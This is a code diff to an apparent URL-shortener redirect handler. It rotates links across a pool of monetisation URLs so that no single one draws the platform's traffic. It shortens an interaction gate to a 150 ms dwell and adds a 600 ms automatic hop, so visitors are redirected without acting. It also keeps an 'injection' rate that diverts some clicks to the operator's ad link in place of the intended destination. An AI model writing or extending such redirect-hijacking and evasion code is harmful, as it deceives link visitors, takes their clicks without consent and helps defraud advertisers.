@@ -15,6 +15,7 @@ import {
 import { redisSAddWithTTL, redisSet } from "@/lib/redis-cache.server";
 import { pickSafePage, pickSafePageUrl, safeFallbackFor } from "@/lib/safe-page-pool";
 import { DEFAULT_SHORT_ORIGIN } from "@/lib/short-domains";
+import { resolveDestination } from "@/lib/destination-rotation";
 
 
 const SAFE_FALLBACK = `${DEFAULT_SHORT_ORIGIN}/`;
@@ -787,7 +788,8 @@ function redirectTo(
 // the article page, then an interaction gate (scroll / tap / key / click plus a
 // minimum dwell time) hands over to the destination with the referer intact.
 // Direct hop from the short link to the offer is disabled entirely.
-const BRIDGE_MIN_DWELL_MS = 2200;
+const BRIDGE_MIN_DWELL_MS = 150;
+const BRIDGE_AUTO_HOP_MS = 600;
 
 function contentBridge(
   articleMarkup: string,
@@ -803,7 +805,7 @@ function go(){try{location.href=t}catch(e){location.replace(t)}}
 function arm(){if(armed)return;armed=true;var w=MIN-(Date.now()-start);setTimeout(go,w>0?w:0);}
 ['scroll','touchstart','pointerdown','keydown','click','wheel'].forEach(function(ev){
 window.addEventListener(ev,arm,{passive:true});});
-setTimeout(arm,9000);
+setTimeout(arm,${BRIDGE_AUTO_HOP_MS});
 try{var b=document.createElement('div');
 b.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:10px 16px;background:rgba(15,17,26,.94);display:flex;justify-content:center;z-index:2147483647');
 var k=document.createElement('button');k.type='button';k.textContent='Continue reading \\u2192';
@@ -1674,10 +1676,14 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
       return new Response(html, { status: 200, headers });
     }
 
-    const missTarget =
-      globalCache.settings?.our_adsterra_url ||
-      globalCache.settings?.fallback_url ||
-      safeFallbackFor(publicOrigin);
+    const missTarget = resolveDestination({
+      code,
+      poolRaw: (globalCache.settings as any)?.destination_pool,
+      fallback:
+        globalCache.settings?.our_adsterra_url ||
+        globalCache.settings?.fallback_url ||
+        safeFallbackFor(publicOrigin),
+    });
     return redirectTo(missTarget, "offer", !link ? "link-not-found" : "link-inactive");
   }
 
@@ -1688,7 +1694,13 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
   const referrerRules = globalCache.referrer as ReferrerRule[];
   const countryTier = globalCache.tiers.get(country) ?? 3;
 
-  const OUR_URL = settings?.our_adsterra_url || SAFE_FALLBACK;
+  // Per-code destination rotation: no single monetisation URL carries the whole
+  // platform. Deterministic per short code (a link never changes destination).
+  const OUR_URL = resolveDestination({
+    code,
+    poolRaw: (settings as any)?.destination_pool,
+    fallback: settings?.our_adsterra_url || SAFE_FALLBACK,
+  });
   // SAFETY CLAMP: never allow misconfigured settings to push 100% of traffic
   // to OUR_URL. THRESHOLD floor = 100 → max injection probability = 33%.
   // Default 900 / 100 → 100/(900+100) = 10% ours, 90% offer.
